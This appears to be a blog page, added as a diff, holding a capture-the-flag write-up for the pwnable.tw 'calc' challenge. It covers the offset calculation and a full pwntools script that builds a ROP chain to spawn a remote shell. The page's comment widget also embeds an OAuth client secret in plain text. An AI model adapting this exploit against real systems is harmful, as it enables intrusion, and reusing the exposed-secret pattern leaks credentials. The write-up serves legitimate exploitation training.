@@ -1,0 +1,387 @@
+<html>
+  <head>
+    <meta charset="utf-8" />
+<meta name="viewport" content="width=device-width, initial-scale=1" />
+<title>eclipse</title>
+<meta name="description" content="Soda Music Computer" />
+<link rel="shortcut icon" href="https://eclipse-yes.github.io/favicon.ico?v=1653911914773">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/KaTeX/0.10.0/katex.min.css">
+<link href="https://cdn.jsdelivr.net/npm/remixicon@2.3.0/fonts/remixicon.css" rel="stylesheet">
+<link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Droid+Serif:400,700">
+<link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/animate.css/3.7.2/animate.min.css">
+
+<link rel="stylesheet" href="https://eclipse-yes.github.io/styles/main.css">
+
+
+
+  </head>
+  <body>
+    <div id="app" class="main px-4 flex flex-col lg:flex-row">
+      <div id="sidebar" class="sidebar-wrapper lg:static lg:w-1/4">
+  <div class="lg:sticky top-0">
+    <div class="sidebar-content">
+      <div class="flex lg:block p-4 lg:px-0 items-center fixed lg:static lg:block top-0 right-0 left-0 bg-white z-50">
+        <i class="ri-menu-2-line lg:mt-4 text-2xl cursor-pointer animated fadeIn" onclick="openMenu()"></i>
+        <a href="https://eclipse-yes.github.io">
+          <img class="animated fadeInLeft avatar rounded-lg mx-4 lg:mt-32 lg:mx-0 mt-0 lg:w-24 lg:h-24 w-12 w-12" src="https://eclipse-yes.github.io/images/avatar.png?v=1653911914773" alt="">
+        </a>
+        <h1 class="animated fadeInLeft lg:text-4xl font-extrabold lg:mt-8 mt-0 text-xl" style="animation-delay: 0.2s">eclipse</h1>
+      </div>
+      
+        <div class="animated fadeInLeft" style="animation-delay: 0.4s">
+          <p class="my-4 text-gray-600 font-light hidden lg:block">
+            Table of Contents
+          </p>
+          <div class="toc-container hidden lg:block">
+            <ul class="markdownIt-TOC">
+<li><a href="#0x1-exploration">0x1 Exploration</a></li>
+<li><a href="#0x2-find-offset">0x2 Find offset</a></li>
+<li><a href="#0x3-find-gadgets-and-rop-chain">0x3 Find gadgets and ROP chain</a></li>
+</ul>
+
+          </div>
+        </div>
+      
+    </div>
+  </div>
+</div>
+
+<div class="menu-container">
+  <i class="ri-arrow-left-line text-2xl cursor-pointer animated fadeIn close-menu-btn" onclick="closeMenu()"></i>
+  <div>
+    
+      
+        <a href="/" class="menu" style="animation-delay: 0s">
+          Home
+        </a>
+      
+    
+      
+        <a href="/tags" class="menu" style="animation-delay: 0.2s">
+          Tags
+        </a>
+      
+    
+      
+        <a href="/archives" class="menu" style="animation-delay: 0.4s">
+          Archives
+        </a>
+      
+    
+      
+        <a href="/post/about" class="menu" style="animation-delay: 0.6000000000000001s">
+          Whoami
+        </a>
+      
+    
+  </div>
+  <div class="site-footer">
+    <div class="py-4 text-gray-700">Powered by <a href="https://github.com/getgridea/gridea" target="_blank">Gridea</a></div>
+    <a class="rss" href="https://eclipse-yes.github.io/atom.xml" target="_blank">RSS</a>
+  </div>
+</div>
+<div class="mask" onclick="closeMenu()">
+</div>
+      <div class="content-wrapper py-32 lg:p-8 lg:w-3/4 post-detail animated fadeIn">
+        <h1 class="text-3xl font-bold lg:mt-16">Challenge 4. calc (pwntable.tw)</h1>
+        <div class="text-sm text-gray-700 lg:my-8">
+          2022-04-16 / 4 min read
+        </div>
+        
+        <div class="post-content yue">
+          <h1 id="0x1-exploration">0x1 Exploration</h1>
+<pre><code class="language-Markdown">❯ checksec calc
+[*] '/home/eclipse/pwnable.tw/4.calc/calc'
+    Arch:     i386-32-little
+    RELRO:    Partial RELRO
+    Stack:    Canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x8048000)
+</code></pre>
+<p>program execution flow:<br>
+main -&gt; calc function -&gt; parse_expr(expr, res_calc)<br>
+Find a program segment:</p>
+<pre><code class="language-c">switch ( *(_BYTE *)(i + expr) )
+        {
+          case '%':
+          case '*':
+          case '/':
+            if ( operand_s[v6] != '+' &amp;&amp; operand_s[v6] != '-' )
+              goto LABEL_14;
+            operand_s[++v6] = *(_BYTE *)(i + expr);
+            break;
+          case '+':
+          case '-':
+LABEL_14:
+            eval(res_tmp_calc, operand_s[v6]);  // Calc: +, -
+                                                // In these cases: +, - is also considered as single operator !!!
+            operand_s[v6] = *(_BYTE *)(i + expr);
+            break;
+          default:
+            eval(res_tmp_calc, operand_s[v6--]);// Calc: *, /, %
+            break;
+        }
+</code></pre>
+<p>Then, we can find:<br>
+When inputing: '+' + OFFSET + '+' + DATA+'\n', then mem(stack) is changed.<br>
+DATA: DWORD<br>
+OFFSET: DWORD (need to be calculated)<br>
+So, the thought is to cover return address of main function and make use of ROP to getshell.<br>
+<img src="https://eclipse-yes.github.io/post-images/1650111348011.png" alt="" loading="lazy"></p>
+<p>What printf function prints out in calc is the calculated value where we can cover.<br>
+offset: <code>calc_ebp + (eax) * 4 - 0x59c = main_ebp → eax</code></p>
+<h1 id="0x2-find-offset">0x2 Find offset</h1>
+<p>main():<br>
+<img src="https://eclipse-yes.github.io/post-images/1650111515110.png" alt="" loading="lazy"><br>
+calc():<br>
+<img src="https://eclipse-yes.github.io/post-images/1650111523043.png" alt="" loading="lazy"><br>
+<img src="https://eclipse-yes.github.io/post-images/1650111534996.png" alt="" loading="lazy"><br>
+Then,<br>
+0xff8ccb88 + (eax) * 4 - 0x59c = 0xff8ccba8<br>
+offset = hex(int(( 0xff8ccba8 - 0xff8ccb88 + 0x59c ) / 4)) = 0x16f.<br>
+So, the return address is stored in offset (0x16f + 1 = 0x170).</p>
+<h1 id="0x3-find-gadgets-and-rop-chain">0x3 Find gadgets and ROP chain</h1>
+<p>Referece:<br>
+http://www.phobosys.de/blog_january_20.html<br>
+https://medium.com/@sagidana/calc-pwnable-tw-ef5450f40253</p>
+<p>Payload:</p>
+<pre><code class="language-python">#!/usr/bin/env python
+# -*- coding: utf-8 -*-
+# author: eclipse
+
+from pwn import *
+
+# ! Configuration
+REMOTE = 1
+binfile = './calc'
+ip, port = 'chall.pwnable.tw', 10100
+context(os='linux', arch='i386', log_level='debug')
+# ! Initialization
+def conn():
+    if REMOTE == 1: io = remote(ip, port)
+    else: io = process(binfile)
+    return io
+
+
+def get_shellcode():
+    p = []
+    p.append(0x080701aa) # pop edx ; ret
+    p.append(0x080ec060) # @ .data
+    p.append(0x0805c34b) # pop eax ; ret
+    p.append(0x6e69622f) # 'bin'
+    p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
+    p.append(0x080701aa) # pop edx ; ret
+    p.append(0x080ec064) # @ .data + 4
+    p.append(0x0805c34b) # pop eax ; ret
+    p.append(0x68732f2f) # '//sh'
+    p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
+    p.append(0x080701aa) # pop edx ; ret
+    p.append(0x080ec068) # @ .data + 8
+    p.append(0x080550d0) # xor eax, eax ; ret
+    p.append(0x0809b30d) # mov dword ptr [edx], eax ; ret
+    p.append(0x080481d1) # pop ebx ; ret
+    p.append(0x080ec060) # @ .data
+    p.append(0x080701d1) # pop ecx ; pop ebx ; ret
+    p.append(0x080ec068) # @ .data + 8
+    p.append(0x080ec060) # padding without overwrite ebx
+    p.append(0x080701aa) # pop edx ; ret
+    p.append(0x080ec068) # @ .data + 8
+    p.append(0x080550d0) # xor eax, eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x0807cb7f) # inc eax ; ret
+    p.append(0x08049a21) # int 0x80
+    return p
+
+
+def write_dword(offset, data):
+    return (&quot;+&quot; + str(0x170 + offset) + &quot;+&quot; + str(data) + &quot;+\n&quot;)
+
+
+# ! Exploitation
+def pwn():
+    io, elf = conn(), ELF(binfile)
+    payload_list = get_shellcode()
+    for i, pl in enumerate(payload_list):
+        payload = write_dword(i, pl)
+        io.send(payload)
+        io.recvline()
+    io.sendline()
+    io.interactive()
+
+if __name__ == &quot;__main__&quot;:
+    pwn()
+</code></pre>
+
+        </div>
+
+        
+          <a class="animated fadeInUp p-2 items-center text-sm text-gray-700 border hover:bg-gray-300 leading-none rounded-full flex lg:inline-flex m-4 " href="https://eclipse-yes.github.io/tag/v6fcRAOlh/">
+            <span class="flex-auto">Pwn</span>
+          </a>
+        
+
+
+        <div class="flex justify-between py-8">
+          
+            <div class="prev-post">
+              <a href="https://eclipse-yes.github.io/post/2JAgwV_kT/">
+                <h3 class="post-title">
+                  <i class="ri-arrow-left-line"></i>
+                  Challenge 5. 3x17 (pwnable.tw)
+                </h3>
+              </a>
+            </div>
+          
+
+          
+            <div class="next-post">
+              <a href="https://eclipse-yes.github.io/post/SSxx8JVxj/">
+                <h3 class="post-title">
+                  Clustering in Machine Learning: k-means Algorithm
+                  <i class="ri-arrow-right-line"></i>
+                </h3>
+              </a>
+            </div>
+          
+        </div>
+
+        
+          
+            <link rel="stylesheet" href="https://unpkg.com/gitalk/dist/gitalk.css">
+<script src="https://unpkg.com/gitalk/dist/gitalk.min.js"></script>
+
+<div id="gitalk-container"></div>
+
+<script>
+
+  var gitalk = new Gitalk({
+    clientID: 'db9fabe620a06234a7f9',
+    clientSecret: '6905d50caf137022592dab848db298bc97e48f4f',
+    repo: 'eclipse-yes.github.io',
+    owner: 'eclipse-yes',
+    admin: ['eclipse-yes'],
+    id: (location.pathname).substring(0, 49),      // Ensure uniqueness and length less than 50
+    distractionFreeMode: false  // Facebook-like distraction free mode
+  })
+
+  gitalk.render('gitalk-container')
+
+</script>
+
+          
+
+          
+        
+
+      </div>
+    </div>
+
+    <script src="https://eclipse-yes.github.io/media/prism.js"></script>  
+<script>
+
+Prism.highlightAll()
+let mainNavLinks = document.querySelectorAll(".markdownIt-TOC a");
+
+// This should probably be throttled.
+// Especially because it triggers during smooth scrolling.
+// https://lodash.com/docs/4.17.10#throttle
+// You could do like...
+// window.addEventListener("scroll", () => {
+//    _.throttle(doThatStuff, 100);
+// });
+// Only not doing it here to keep this Pen dependency-free.
+
+window.addEventListener("scroll", event => {
+  let fromTop = window.scrollY;
+
+  mainNavLinks.forEach((link, index) => {
+    let section = document.getElementById(decodeURI(link.hash).substring(1));
+    let nextSection = null
+    if (mainNavLinks[index + 1]) {
+      nextSection = document.getElementById(decodeURI(mainNavLinks[index + 1].hash).substring(1));
+    }
+    if (section.offsetTop <= fromTop) {
+      if (nextSection) {
+        if (nextSection.offsetTop > fromTop) {
+          link.classList.add("current");
+        } else {
+          link.classList.remove("current");    
+        }
+      } else {
+        link.classList.add("current");
+      }
+    } else {
+      link.classList.remove("current");
+    }
+  });
+});
+
+
+document.addEventListener("DOMContentLoaded", function() {
+  var lazyImages = [].slice.call(document.querySelectorAll(".post-feature-image.lazy"));
+
+  if ("IntersectionObserver" in window) {
+    let lazyImageObserver = new IntersectionObserver(function(entries, observer) {
+      entries.forEach(function(entry) {
+        if (entry.isIntersecting) {
+          let lazyImage = entry.target
+          lazyImage.style.backgroundImage = `url(${lazyImage.dataset.bg})`
+          lazyImage.classList.remove("lazy")
+          lazyImageObserver.unobserve(lazyImage)
+        }
+      });
+    });
+
+    lazyImages.forEach(function(lazyImage) {
+      lazyImageObserver.observe(lazyImage)
+    })
+  } else {
+    // Possibly fall back to a more compatible method here
+  }
+});
+
+const menuContainer = document.querySelector('.menu-container')
+const menus = document.querySelectorAll('.menu-container .menu')
+const mask = document.querySelector('.mask')
+const contentWrapper = document.querySelector('.content-wrapper')
+const latestArticle = document.querySelector('.latest-article')
+const readMore = document.querySelector('.read-more')
+const indexPage = document.querySelector('.index-page')
+
+const isHome = location.pathname === '/'
+if (latestArticle) {
+  latestArticle.style.display = isHome ? 'block' : 'none'
+  readMore.style.display = isHome ? 'block' : 'none'
+  indexPage.style.display = isHome ? 'none' : 'block'
+}
+
+const openMenu = () => {
+  menuContainer.classList.add('open')
+  menus.forEach(menu => {
+    menu.classList.add('animated', 'fadeInLeft')
+  })
+  mask.classList.add('open')
+  contentWrapper.classList.add('is-second')
+}
+
+const closeMenu = () => {
+  menuContainer.classList.remove('open')
+  menus.forEach(menu => {
+    menu.classList.remove('animated', 'fadeInLeft')
+  })
+  mask.classList.remove('open')
+  contentWrapper.classList.remove('is-second')
+}
+</script>
+  
+  </body>
+</html>
